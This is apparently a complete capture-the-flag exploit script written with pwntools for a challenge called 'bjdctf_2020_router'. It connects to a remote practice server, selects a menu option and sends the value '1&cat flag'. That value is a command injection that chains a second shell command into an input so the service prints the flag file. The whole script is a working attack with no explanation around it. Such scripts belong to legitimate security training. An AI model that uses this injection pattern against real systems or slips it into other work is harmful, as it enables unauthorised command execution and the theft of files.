from pwn import *
context(log_level='debug')
#io = process("./bjdctf_2020_router")
io = remote("node3.buuoj.cn",28235)
io.recv()
io.sendline("1")
io.recv()
io.sendline("1&cat flag")
io.recv()